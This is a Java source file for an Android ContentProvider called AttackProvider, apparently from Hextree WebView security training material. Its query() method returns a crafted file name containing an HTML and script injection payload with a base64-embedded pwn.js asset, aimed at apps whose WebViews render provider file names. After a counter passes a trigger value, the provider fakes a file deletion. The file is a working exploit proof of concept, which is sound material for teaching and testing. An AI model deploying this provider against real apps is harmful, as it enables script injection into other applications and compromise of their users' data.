package io.hextree.webviews;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Random;

public class AttackProvider extends ContentProvider {
    public AttackProvider() {
    }

    int TRIGGER = 8;

    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                        String[] selectionArgs, String sortOrder) {
        int state = IntegerState.getValue();
        Log.i("AttackProvider", "query("+uri.toString()+") "+state);

        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });



        IntegerState.setValue(state+1);

        if(state>TRIGGER) {

            cursor.addRow(new Object[]{
                    "test.txt", 12345
            });
            return cursor;
        } else {

            String pwnJs = Utils.readAssetFile(getContext(), "pwn.js");
            String b64 = Base64.encodeToString(pwnJs.getBytes(), Base64.DEFAULT);
            cursor.addRow(new Object[]{
                    "\"><h1>hextree.io</h1><script src='data:application/json;base64,"+b64+"' >", 12345
            });
            return cursor;
        }
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
        int state = IntegerState.getValue();
        Log.i("AttackProvider", "openFile(" + uri.toString() + ") allowOpen: "+state);

        if(state>TRIGGER) {
            throw new FileNotFoundException("Trigger fake delete");
        }

        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    outputStream.write("<h1>File Content</h1>".getBytes());
                    outputStream.close();
                } catch (IOException e) {
                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
        }
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i("AttackProvider", "delete("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public String getType(Uri uri) {
        Log.i("AttackProvider", "getType("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i("AttackProvider", "insert("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public boolean onCreate() {
        Log.i("AttackProvider", "onCreate()");
        return true;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection,
                      String[] selectionArgs) {
        Log.i("AttackProvider", "update("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
